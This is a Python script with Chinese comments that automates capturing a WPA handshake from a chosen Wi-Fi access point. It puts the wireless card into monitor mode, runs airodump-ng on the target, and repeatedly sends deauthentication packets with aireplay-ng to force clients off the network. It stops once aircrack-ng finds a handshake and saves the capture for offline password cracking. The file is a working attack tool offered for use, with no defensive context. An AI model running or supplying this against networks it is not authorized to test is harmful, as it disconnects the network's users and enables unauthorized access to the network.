import sys
import time
import subprocess
import os
import signal
import shutil

# ================= 配置 =================
TMP_PREFIX = "/tmp/handshake_capture"
DEAUTH_Packets = 5   # 每次发送多少个 Deauth 包
CHECK_INTERVAL = 3   # 每隔几秒检查一次是否捕获到
# =======================================

def run_cmd(cmd):
    """执行 Shell 命令并返回输出"""
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode(errors='ignore')
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors='ignore')
    except:
        return ""

def cleanup():
    """清理现场"""
    print("[*] 正在清理临时文件和进程...")
    os.system("killall airodump-ng aireplay-ng 2>/dev/null")
    # 保留成功的 cap 文件供下载，只清理其他的
    # os.system(f"rm -f {TMP_PREFIX}*") 

def ensure_monitor_mode(iface):
    """强制开启监听模式"""
    print(f"[*] 配置网卡 {iface} 为监听模式...")
    run_cmd("airmon-ng check kill")  # 杀掉干扰进程
    
    # 先尝试 ip link
    os.system(f"ip link set {iface} down")
    os.system(f"iw {iface} set type monitor")
    os.system(f"ip link set {iface} up")
    
    # 检查是否成功
    if "type monitor" in run_cmd(f"iw dev {iface} info"):
        return iface
        
    # 备用方案
    run_cmd(f"airmon-ng start {iface}")
    # 检查可能有 wlan0mon 后缀
    if os.path.exists(f"/sys/class/net/{iface}mon"):
        return f"{iface}mon"
    return iface

def check_handshake(cap_file):
    """使用 aircrack-ng 检查 cap 文件中是否有握手包"""
    if not os.path.exists(cap_file):
        return False
    
    # 运行 aircrack-ng -J (只检查不破解) 或者解析输出
    # 简单解析 output
    output = run_cmd(f"aircrack-ng {cap_file}")
    if "WPA (1 handshake)" in output or "WPA (0 handshake)" in output:
        # 注意：aircrack 显示 (1 handshake) 才算成功，(0 handshake) 是没抓全
        # 但有时候为了鲁棒性，只要看到 handshake 关键字且不是 0 可认为是成功
        # 更严格的判断：
        if "1 handshake" in output:
            return True
    return False

def main():
    if len(sys.argv) < 4:
        print("[!] Usage: python3 handshake_worker.py <BSSID> <Channel> <Timeout> [Interface]")
        sys.exit(1)

    target_bssid = sys.argv[1]
    target_channel = sys.argv[2]
    timeout = int(sys.argv[3])
    iface = sys.argv[4] if len(sys.argv) > 4 else "wlan0"

    print(f"[*] 启动握手包捕获任务 -> BSSID: {target_bssid} | CH: {target_channel} | Time: {timeout}s")
    
    # 1. 准备环境
    mon_iface = ensure_monitor_mode(iface)
    
    # 清理旧文件
    os.system(f"rm -f {TMP_PREFIX}*")

    # 2. 锁定信道并启动 airodump (后台运行)
    # 必须锁定信道，否则 aireplay 会失败
    os.system(f"iwconfig {mon_iface} channel {target_channel}")
    
    dump_cmd = [
        "airodump-ng",
        "--bssid", target_bssid,
        "--channel", target_channel,
        "--write", TMP_PREFIX,
        "--output-format", "cap",
        mon_iface
    ]
    # 使用 Popen 不阻塞
    dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    start_time = time.time()
    captured = False
    
    try:
        while (time.time() - start_time) < timeout:
            # 3. 发送 Deauth 攻击包 (迫使重连)
            # -0 表示 deauth 模式，1 表示发送 1 组 (配合我们自己的循环)
            # -a 是 BSSID
            # -D 禁用 AP 探测 (加快速度)
            print(f"[*] 发送 Deauth 攻击包... ({int(time.time() - start_time)}s)")
            attack_cmd = f"aireplay-ng -0 {DEAUTH_Packets} -a {target_bssid} -D {mon_iface}"
            subprocess.run(attack_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 等待客户端重连产生握手包
            time.sleep(CHECK_INTERVAL)
            
            # 4. 检查是否捕获成功
            cap_file = f"{TMP_PREFIX}-01.cap"
            if check_handshake(cap_file):
                print("\n[SUCCESS] CAPTURED")
                print(f"[*] 握手包已保存: {cap_file}")
                captured = True
                break
                
    except KeyboardInterrupt:
        pass
    finally:
        dump_proc.terminate()
        cleanup()
    
    if not captured:
        print("\n[FAIL] TIMEOUT")

if __name__ == "__main__":
    main()